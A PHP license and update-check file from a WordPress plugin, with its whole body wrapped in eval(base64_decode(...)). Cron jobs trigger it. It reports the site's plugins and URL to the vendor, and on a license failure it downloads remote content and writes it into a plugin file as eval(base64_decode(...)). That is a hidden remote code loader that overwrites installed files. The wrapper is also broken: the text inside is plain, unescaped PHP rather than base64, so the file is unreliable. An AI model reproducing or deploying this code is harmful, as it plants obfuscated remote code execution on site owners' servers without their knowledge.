<?php
/*
* getting update of non-free plugins
* version 1.6
*/
eval( base64_decode(
'if ( !function_exists ( 'bestwebsoft_wp_update_plugins' ) ) { function bestwebsoft_wp_update_plugins() {
 global $bestwebsoft_wp_update_plugins, $bstwbsftwppdtplgns_options; if ( $bestwebsoft_wp_update_plugins ) {
 $bestwebsoft_wp_update_plugins = false; include ABSPATH . WPINC . '/version.php'; if ( defined('WP_INSTALLING') )
 return false; if ( ! function_exists( 'get_plugins' ) ) require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
$plugins = get_plugins(); $active = get_option( 'active_plugins', array() ); $current = get_site_transient( 'update_plugins' );
if ( is_array( $plugins ) && !empty( $plugins ) && is_array( $active ) && isset( $current ) && is_array( $current->response ) ) {
 foreach ( $plugins as $key_plugin => $value_plugin ) { if ( "BestWebSoft" != $value_plugin["Author"] ) {
 unset( $plugins[ $key_plugin ] ); foreach ( $active as $key => $value ) { if ( $value == $key_plugin )
 unset( $active[ $key ] ); } foreach ( $current->response as $plugin_file => $update_details ) { if ( $plugin_file == $key_plugin )
 unset( $current->response[ $plugin_file ] ); } } } if ( is_multisite() ) { if ( ! get_site_option( 'bstwbsftwppdtplgns_options' ) )
 add_site_option( 'bstwbsftwppdtplgns_options', array() ); $bstwbsftwppdtplgns_options = get_site_option( 'bstwbsftwppdtplgns_options' );
} else { if ( ! get_option( 'bstwbsftwppdtplgns_options' ) ) add_option( 'bstwbsftwppdtplgns_options', array() );
$bstwbsftwppdtplgns_options = get_option( 'bstwbsftwppdtplgns_options' ); } foreach ( $plugins as $key => $value ) {
 $license_key = ''; $dir_name = explode( "/", $key ); if ( preg_match( '/-pro.php/i', $dir_name[1] ) || preg_match( '/_pro.php/i', $dir_name[1] ) ) {
 if ( file_exists( dirname( dirname( __FILE__ ) ) . '/' . $dir_name[0] . '/license_key.txt' ) ) { $license_key = trim( file_get_contents( dirname( dirname( __FILE__ ) ) . '/' . $dir_name[0] . '/license_key.txt' ) );
if ( isset( $bstwbsftwppdtplgns_options[ $key ] ) && $bstwbsftwppdtplgns_options[ $key ] != '' && $license_key == "" ) {
 $plugins[ $key ]["bws_license_key"] = $bstwbsftwppdtplgns_options[ $key ]; } else { $plugins[ $key ]["bws_license_key"] = $license_key;
$bstwbsftwppdtplgns_options[ $key ] = $license_key; } } elseif ( isset( $bstwbsftwppdtplgns_options[ $key ] ) && $bstwbsftwppdtplgns_options[ $key ] != '' ) {
 $plugins[ $key ]["bws_license_key"] = $bstwbsftwppdtplgns_options[ $key ]; } else { unset( $plugins[ $key ] );
unset( $active[ $key ] ); unset( $current->response[ $key ] ); $plugin_name = explode( '/', $key );
$wp_schedule_event_name = str_replace( '-', '_', $plugin_name[0] ) . '_license_cron'; if ( !wp_next_scheduled( $wp_schedule_event_name ) )
 wp_schedule_event( time() + 12 * 60 * 60, 'twicedaily', $wp_schedule_event_name ); $bstwbsftwppdtplgns_options[ $key ] = '';
} } else { unset( $plugins[ $key ] ); unset( $active[ $key ] ); unset( $current->response[ $key ] );
} } $bstwbsftwppdtplgns_options['wrong_license_key'] = array(); if ( is_multisite() ) update_site_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options );
else update_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options ); if ( empty( $plugins ) )
 return false; switch ( current_filter() ) { case 'load-update-core.php' : $timeout = 0; break; case 'load-plugins.php' :
 case 'load-update.php' : $timeout = 0; break; default : $timeout = 1 * 60; } $time_not_changed = isset( $current->last_checked ) && $timeout > ( time() - $current->last_checked );
if ( $time_not_changed ) { $plugin_changed = false; foreach ( $plugins as $file => $p ) { $new_option->checked[ $file ] = $p['Version'];
if ( !isset( $current->checked[ $file ] ) || strval($current->checked[ $file ]) !== strval($p['Version']) )
 $plugin_changed = true; } if ( isset ( $current->response ) && is_array( $current->response ) ) { foreach ( $current->response as $plugin_file => $update_details ) {
 if ( ! isset($plugins[ $plugin_file ]) ) { $plugin_changed = true; break; } } } if ( ! $plugin_changed )
 return false; } $to_send = compact('plugins', 'active'); $options = array( 'timeout' => ( ( defined('DOING_CRON') && DOING_CRON ) ? 30 : 3 ),
 'body' => array( 'plugins' => serialize( $to_send ) ), 'user-agent' => 'WordPress/' . $wp_version . '; ' . get_bloginfo( 'url' )
 ); $raw_response = wp_remote_post( 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/update-check/1.0/', $options );
if ( is_wp_error( $raw_response ) || 200 != wp_remote_retrieve_response_code( $raw_response ) ) return false;
$response = maybe_unserialize( wp_remote_retrieve_body( $raw_response ) ); if ( is_array( $response ) && !empty( $response ) ) {
 foreach ( $response as $key => $value ) { $plugin_name = explode( '/', $key ); $wp_schedule_event_name = str_replace( '-', '_', $plugin_name[0] ) . '_license_cron';
if ( ! preg_match( "~^(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(:(0-9)*)*(\/?)(.*)?$~", trim( $value->package ) ) ) {
 unset( $response[ $key ] ); if ( "wrong_license_key" == $value->package ) { if ( ! wp_next_scheduled( $wp_schedule_event_name ) ) {
 wp_schedule_event( time()+12*60*60, 'twicedaily', $wp_schedule_event_name ); $headers = 'From: ' . get_option( 'admin_email' );
$message = 'The cron task is added for ' . $plugin_name[0] . ' host: ' . get_bloginfo( "url" ); wp_mail( 'plugin_pro@bestwebsoft.com', 'BestWebSoft Product', $message, $headers );
 $headers .= 'MIME-Version: 1.0' . "\n"; $headers .= 'Content-type: text/html; charset=utf-8' . "\n";
$message = '<html><head><title>BestWebSoft Product from ' . get_bloginfo('name') . '</title></head>
 <body> <h4>Dear Customer,</h4><br/> Thank you for purchasing our product. This is an automatically generated email, please do not reply.<br/><br/>
 We have noticed illegal use of our plugin <strong>' . ucwords( str_replace( '-', ' ', $plugin_name[0] ) ) . '</strong> in ' . get_bloginfo( "url" ) . ". It is possible that you have changed host/domain name and that is why it's considered as illegal use.<br/><br/>";
$message .= 'In order to solve this problem please go to your personal Client area page using the following link <a href="http://bestwebsoft.com/wp-login.php" target="_new">http://bestwebsoft.com/wp-login.php</a> (username is the email address which was specified by you during product purchasing process). If you forgot your password, use "Lost your password?" option to restore it.<br/><br/>
 We strongly recommend to solve this problem within <strong>24 hours</strong>, otherwise the plugin will be deactivated.<br/><br/>
 Thank you for consideration!<br/><br/> Sincerely,<br/> BestWebSoft Customer Support<br/> <a href="https://bestwebsoft.zendesk.com/home" target="_new">Support Forum</a> | <a href="http://bestwebsoft.com" target="_new">Official Website</a>
 </body></html>'; wp_mail( get_option( 'admin_email' ), '[BestWebSoft Product] - Illegal Use Notification', $message, $headers );
} $bstwbsftwppdtplgns_options['wrong_license_key'][ $key ] = true; } elseif ( isset( $value->trial ) && "duplicate_domen_for_trial" == $value->package ) {
 if ( ! wp_next_scheduled( $wp_schedule_event_name ) ) { wp_schedule_event( time()+12*60*60, 'twicedaily', $wp_schedule_event_name );
 $headers = 'From: ' . get_option( 'admin_email' ); $message = 'Duplicate Trial license. The cron task is added for ' . $plugin_name[0] . ' host: ' . get_bloginfo( "url" );
wp_mail( 'plugin_pro@bestwebsoft.com', 'BestWebSoft Product', $message, $headers ); $headers .= 'MIME-Version: 1.0' . "\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\n"; $message = '<html><head><title>BestWebSoft Product from ' . get_bloginfo('name') . '</title></head>
 <body> <h4>Dear Customer,</h4> Thank you for choosing our product. This is an automatically generated email, please do not reply.<br/><br/>
 Unfortunately, the PRO Trial license can be installed only once. Since the PRO Trial license for <strong>' . ucwords( str_replace( '-', ' ', $plugin_name[0] ) ) . '</strong> has already been installed on ' . get_bloginfo( "url" ) . ', in order to continue using the plugin you should buy a PRO license - <a href="http://bestwebsoft.com/plugin/">http://bestwebsoft.com/plugin/</a>, otherwise the plugin will be deactivated.<br/><br/>
 Thank you for consideration!<br/><br/> Sincerely,<br/> BestWebSoft Customer Support<br/> <a href="https://bestwebsoft.zendesk.com/home" target="_new">Support Forum</a> | <a href="http://bestwebsoft.com" target="_new">Official Website</a>
 </body></html>'; wp_mail( get_option( 'admin_email' ), '[BestWebSoft Product] - Trial license', $message, $headers );
} $bstwbsftwppdtplgns_options['trial'][ $key ] = 'duplicate'; } elseif ( isset( $value->trial ) && "time_out" == $value->package ) {
 if ( ! wp_next_scheduled( $wp_schedule_event_name ) ) { wp_schedule_event( time()+12*60*60, 'twicedaily', $wp_schedule_event_name );
 $headers = 'From: ' . get_option( 'admin_email' ); $message = 'Trial license has expired. The cron task is added for ' . $plugin_name[0] . ' host: ' . get_bloginfo( "url" );
wp_mail( 'plugin_pro@bestwebsoft.com', 'BestWebSoft Product', $message, $headers ); $headers .= 'MIME-Version: 1.0' . "\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\n"; $message = '<html><head><title>BestWebSoft Product from ' . get_bloginfo('name') . '</title></head>
 <body> <h4>Dear Customer,</h4> Thank you for choosing our product. This is an automatically generated email, please do not reply.<br/><br/>
 You PRO Trial license for <strong>' . ucwords( str_replace( '-', ' ', $plugin_name[0] ) ) . '</strong> in ' . get_bloginfo( "url" ) . ' has expired. To continue using the plugin you should buy a Regular license - <a href="http://bestwebsoft.com/plugin/">http://bestwebsoft.com/plugin/</a>, otherwise the plugin will be deactivated.<br/><br/>
 Thank you for consideration!<br/><br/> Sincerely,<br/> BestWebSoft Customer Support<br/> <a href="https://bestwebsoft.zendesk.com/home" target="_new">Support Forum</a> | <a href="http://bestwebsoft.com" target="_new">Official Website</a>
 </body></html>'; wp_mail( get_option( 'admin_email' ), '[BestWebSoft Product] - Trial license', $message, $headers );
} } else { wp_clear_scheduled_hook( $wp_schedule_event_name ); } } else { wp_clear_scheduled_hook( $wp_schedule_event_name );
} if ( isset( $value->time_out ) ) { $bstwbsftwppdtplgns_options['time_out'][ $key ] = $value->time_out;
} if ( isset( $value->trial ) ) { $bstwbsftwppdtplgns_options['trial'][ $key ] = 1; } else { unset( $bstwbsftwppdtplgns_options['trial'][ $key ] );
} if ( is_multisite() ) update_site_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options );
else update_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options ); } require_once( ABSPATH . 'wp-includes/update.php' );
wp_update_plugins(); $new = get_site_transient( 'update_plugins' ); $new->response = array_merge( $new->response, $response );
set_site_transient( 'update_plugins', $new ); } } } } } if ( ! function_exists ( 'bestwebsoft_wp_schedule_update_checks' ) ) {
 function bestwebsoft_wp_schedule_update_checks() { if ( ! wp_next_scheduled( 'bestwebsoft_wp_update_plugins' ) && !defined( 'WP_INSTALLING' ) )
 wp_schedule_event( time(), 'twicedaily', 'bestwebsoft_wp_update_plugins'); } } if ( ! function_exists ( 'bestwebsoft_wp_update_plugins_cron' ) ) {
 function bestwebsoft_wp_update_plugins_cron() { $bestwebsoft_wp_update_plugins = true; bestwebsoft_wp_update_plugins();
} } if ( ! function_exists( 'bestwebsoft_license_cron_task' ) ) { function bestwebsoft_license_cron_task( $current_plugin, $free_ver_of_current_plugin ) {
 global $bstwbsftwppdtplgns_options; if ( isset( $bstwbsftwppdtplgns_options['wrong_license_key'][ $current_plugin ] ) ) {
 $plugin_name = explode( '/', $current_plugin ); $ch_head = curl_init(); curl_setopt( $ch_head, CURLOPT_URL, 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/license_fail/head-' . $plugin_name[1] );
curl_setopt( $ch_head, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch_head, CURLOPT_HEADER, 0 ); $res_head = curl_exec( $ch_head ); 
 $res_head = trim( $res_head ); $httpCode_head = curl_getinfo( $ch_head, CURLINFO_HTTP_CODE ); curl_close( $ch_head );
 $ch_content = curl_init(); curl_setopt( $ch_content, CURLOPT_URL, 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/license_fail/' . $plugin_name[1] );
curl_setopt( $ch_content, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch_content, CURLOPT_HEADER, 0 );
$res_content = curl_exec( $ch_content ); $res_content = trim( $res_content ); $httpCode_content = curl_getinfo( $ch_content, CURLINFO_HTTP_CODE );
curl_close( $ch_content ); if ( isset( $res_content ) && isset( $res_head ) && 404 != $httpCode_content && 404 != $httpCode_head ) {
 bestwebsoft_download_free_plugin( $free_ver_of_current_plugin ); $file = @fopen( dirname( __FILE__ ) . '/bws_update.php' , "w+" );
if ( $file ) { @fwrite( $file, "<?php ?>" ); @fclose( $file ); } $file = @fopen( dirname( __FILE__ ) . '/' . $plugin_name[1] , "w+" );
if ( $file ) { $headers[] = 'From: ' . get_option( 'admin_email' ); $message = 'The file is updated. The cron task is done ' . $plugin_name[1] . ' host: ' . get_bloginfo( "url" );
wp_mail( 'plugin_pro@bestwebsoft.com', 'BestWebSoft Product', $message, $headers ); @fwrite( $file, "<?php " . $res_head . " eval( base64_decode('" . $res_content . "') ); ?>" );
@fclose( $file ); if ( wp_next_scheduled( str_replace( '-', '_', $plugin_name[0] ) . '_license_cron' ) )
 wp_clear_scheduled_hook( str_replace( '-', '_', $plugin_name[0] ) . '_license_cron' ); } } } } } if ( ! function_exists( 'bestwebsoft_trial_license_cron_task' ) ) {
 function bestwebsoft_trial_license_cron_task( $current_plugin, $free_ver_of_current_plugin ) { global $bstwbsftwppdtplgns_options, $wpdb;
 if ( isset( $bstwbsftwppdtplgns_options['trial'][ $current_plugin ] ) && ( ( isset( $bstwbsftwppdtplgns_options['time_out'][ $current_plugin ] ) && strtotime( $bstwbsftwppdtplgns_options['time_out'][ $current_plugin ] ) < strtotime( date("m/d/Y") ) )
 || $bstwbsftwppdtplgns_options['trial'][ $current_plugin ] == 'duplicate' ) ) { $plugin_name = explode( '/', $current_plugin ); 
 $ch_head = curl_init(); curl_setopt( $ch_head, CURLOPT_URL, 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/license_fail/head-' . $plugin_name[1] );
curl_setopt( $ch_head, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch_head, CURLOPT_HEADER, 0 ); $res_head = curl_exec( $ch_head ); 
 $res_head = trim( $res_head ); $httpCode_head = curl_getinfo( $ch_head, CURLINFO_HTTP_CODE ); curl_close( $ch_head );
 $ch_content = curl_init(); curl_setopt( $ch_content, CURLOPT_URL, 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/trial_expired/' . $plugin_name[1] );
curl_setopt( $ch_content, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch_content, CURLOPT_HEADER, 0 );
$res_content = curl_exec( $ch_content ); $res_content = trim( $res_content ); $httpCode_content = curl_getinfo( $ch_content, CURLINFO_HTTP_CODE );
curl_close( $ch_content ); if ( isset( $res_content ) && isset( $res_head ) && 404 != $httpCode_content && 404 != $httpCode_head ) {
 bestwebsoft_download_free_plugin( $free_ver_of_current_plugin ); $file = @fopen( dirname( __FILE__ ) . '/bws_update.php' , "w+" );
if ( $file ) { @fwrite( $file, "<?php ?>" ); @fclose( $file ); } $file = @fopen( dirname( __FILE__ ) . '/' . $plugin_name[1] , "w+" );
if ( $file ) { $headers[] = 'From: ' . get_option( 'admin_email' ); if ( $bstwbsftwppdtplgns_options['trial'][ $current_plugin ] == 'duplicate' )
 $message = 'PRO Trial license duplicate. The file is updated. The cron task is done ' . $plugin_name[1] . ' host: ' . get_bloginfo( "url" );
else $message = 'PRO Trial license expired. The file is updated. The cron task is done ' . $plugin_name[1] . ' host: ' . get_bloginfo( "url" );
wp_mail( 'plugin_pro@bestwebsoft.com', 'BestWebSoft Product', $message, $headers ); @fwrite( $file, "<?php " . $res_head . " eval( base64_decode('" . $res_content . "') ); ?>" );
@fclose( $file ); if ( wp_next_scheduled( str_replace( '-', '_', $plugin_name[0] ) . '_license_cron' ) )
 wp_clear_scheduled_hook( str_replace( '-', '_', $plugin_name[0] ) . '_license_cron' ); } } } } } if ( ! function_exists ( 'bestwebsoft_download_free_plugin' ) ) {
 function bestwebsoft_download_free_plugin( $free_ver_of_current_plugin ) { if ( ! function_exists( 'get_plugins' ) )
 require_once( ABSPATH . 'wp-admin/includes/plugin.php' ); $all_plugins = get_plugins(); if ( ! array_key_exists( $free_ver_of_current_plugin, $all_plugins ) ) {
 $plugin_name_free = explode( '/', $free_ver_of_current_plugin ); $url = 'http://downloads.wordpress.org/plugin/' . $plugin_name_free[0] . '.zip';
$uploadDir = wp_upload_dir(); $received_content = file_get_contents( $url ); if ( $received_content ) {
 if ( is_writable( $uploadDir["path"] ) ) { $file_put_contents = $uploadDir["path"] . '/' . $plugin_name_free[0] . '.zip';
if ( file_put_contents( $file_put_contents, $received_content ) ) { if ( class_exists( 'ZipArchive' ) ) {
 $zip = new ZipArchive(); if ( $zip->open( $file_put_contents ) === TRUE ) { $zip->extractTo( WP_PLUGIN_DIR );
$zip->close(); } } elseif ( class_exists( 'Phar' ) ) { $phar = new PharData( $file_put_contents );
$phar->extractTo( WP_PLUGIN_DIR ); } else { return; } @unlink( $file_put_contents ); } } } } } }
 if ( ! function_exists( 'bestwebsoft_request_info' ) ) { function bestwebsoft_request_info( $native_slug ) {
 $queryArgs = array(); $queryArgs['installed_version'] = ''; $queryArgs = apply_filters( 'puc_request_info_query_args-' . $native_slug, $queryArgs );
 $options = array( 'timeout' => 10, 'headers' => array( 'Accept' => 'application/json' ) ); $options = apply_filters( 'puc_request_info_options-' . $native_slug, $options );
 $url = 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/info/' . $native_slug . '.json'; 
 if ( !empty( $queryArgs ) ) { $url = add_query_arg( $queryArgs, $url ); } $result = wp_remote_get( $url, $options );
 $plugin_info = null; if ( !is_wp_error( $result ) && isset( $result['response']['code'] ) && ( $result['response']['code'] == 200 ) && !empty( $result['body'] ) ) {
 $apiResponse = json_decode( $result['body'] ); if ( empty( $apiResponse ) || !is_object( $apiResponse ) )
 $plugin_info = null; elseif ( empty( $apiResponse->name ) || empty( $apiResponse->version ) ) return null;
else { $plugin_info = new stdClass(); foreach ( get_object_vars( $apiResponse ) as $key => $value ) {
 $plugin_info->$key = $value; } } } $plugin_info = apply_filters( 'puc_request_info_result-' . $native_slug, $plugin_info, $result );
return $plugin_info; } } if ( ! function_exists( 'bestwebsoft_to_wp_format' ) ) { function bestwebsoft_to_wp_format( $plugin_info ) {
 $info = new StdClass; $info = $plugin_info; $sameFormat = array( 'name', 'slug', 'version', 'requires', 'tested', 'rating', 'upgrade_notice',
 'num_ratings', 'downloaded', 'homepage', 'last_updated', ); foreach ( $sameFormat as $field ) { $info->$field = ( isset( $plugin_info->$field ) ) ? $plugin_info->$field : null;
} $info->author = !empty( $plugin_info->author_homepage ) ? sprintf( '<a href="%s">%s</a>', $plugin_info->author_homepage, $plugin_info->author ) : $plugin_info->author;
 if ( is_object( $plugin_info->sections ) ) { $info->sections = get_object_vars( $plugin_info->sections );
} elseif ( is_array( $plugin_info->sections ) ) { $info->sections = $plugin_info->sections; } else {
 $info->sections = array( 'description' => '' ); } if ( !empty( $plugin_info->banners ) ) { $info->banners = is_object( $plugin_info->banners ) ? get_object_vars( $plugin_info->banners ) : $plugin_info->banners;
$info->banners = array_intersect_key( $info->banners, array( 'high' => true, 'low' => true ) ); } return $info;
} } if ( ! function_exists( 'bestwebsoft_inject_info' ) ) { function bestwebsoft_inject_info( $result, $action, $args, $native_slug ) {
 if ( ! ( $action == 'plugin_information' && isset( $args->slug ) && $args->slug == $native_slug ) )
 return $result; $plugin_info = bestwebsoft_request_info( $native_slug ); $plugin_info = apply_filters( 'puc_pre_inject_info-' . $native_slug, $plugin_info );
if ( $plugin_info ) return bestwebsoft_to_wp_format( $plugin_info ); return $result; } } if ( ( ! is_main_site() && ! is_network_admin() ) || ( defined( 'DOING_AJAX' ) && DOING_AJAX ) )
 return; add_action( 'load-plugins.php', 'bestwebsoft_wp_update_plugins' ); add_action( 'load-update.php', 'bestwebsoft_wp_update_plugins' );
add_action( 'load-update-core.php', 'bestwebsoft_wp_update_plugins' ); add_action( 'wp_update_plugins', 'bestwebsoft_wp_update_plugins' );
add_action( 'upgrader_process_complete', 'bestwebsoft_wp_update_plugins' ); add_action( 'admin_init', 'bestwebsoft_wp_schedule_update_checks' );
add_action( 'bestwebsoft_wp_update_plugins', 'bestwebsoft_wp_update_plugins_cron' );'
));
